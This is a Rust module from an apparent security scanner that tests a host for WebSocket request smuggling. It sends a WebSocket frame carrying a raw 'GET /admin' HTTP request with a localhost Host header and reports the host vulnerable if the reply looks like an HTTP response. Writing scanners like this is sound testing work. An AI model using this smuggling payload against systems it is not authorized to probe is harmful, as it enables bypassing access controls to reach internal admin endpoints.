use crate::auth::AuthStore;
use crate::net::NetConfig;
use crate::output::ScanResult;
use futures_util::{SinkExt, StreamExt};
use tokio_tungstenite::tungstenite::Message;

pub async fn probe(
    cfg: &NetConfig,
    auth: Option<&AuthStore>,
    silent: &bool,
) -> Result<ScanResult, String> {
    let host = &cfg.host;
    let mut auth_headers: Vec<(String, String)> = Vec::new();
    if let Some(a) = auth {
        auth_headers = a.to_headers_vec();
    }

    if !*silent {
        eprintln!("  [DBG] WebSocket smuggling probe on {}:{}", host, cfg.port);
    }

    // Attempt WS upgrade with smuggled HTTP header in the WS key
    let ws_stream = crate::net::ws::ws_connect(
        host, cfg.port, cfg.tls, "/",
        &auth_headers, cfg.timeout.as_secs(),
    ).await?;

    // Send a malformed WS frame that looks like an HTTP request
    let smuggled = b"GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n";
    let (mut write, mut read) = ws_stream.split();

    
    write.send(Message::Binary(smuggled.to_vec())).await.ok();

    // Try to read response
    use tokio::time::timeout;
    use std::time::Duration;
    let mut detected = false;
    loop {
        match timeout(Duration::from_secs(5), read.next()).await {
            Ok(Some(Ok(msg))) => {
                let text = match msg {
                    Message::Text(t) => t.to_string(),
                    Message::Binary(b) => String::from_utf8_lossy(&b).to_string(),
                    _ => continue,
                };
                if text.contains("HTTP/") || text.contains("200") || text.contains("admin") {
                    detected = true;
                }
            }
            Ok(Some(Err(_))) => break,
            Ok(None) => break,
            Err(_) => break,
        }
    }

    let host_name = host;
    Ok(ScanResult {
        host: host_name.to_string(),
        port: cfg.port,
        variant: "websocket".to_string(),
        vulnerable: detected,
        server: None,
        bypass: None,
        status_code: if detected { 200 } else { 0 },
        details: if detected {
            Some("WebSocket smuggling: smuggled HTTP request inside WS frame".into())
        } else {
            None
        },
        ..Default::default()
    })
}
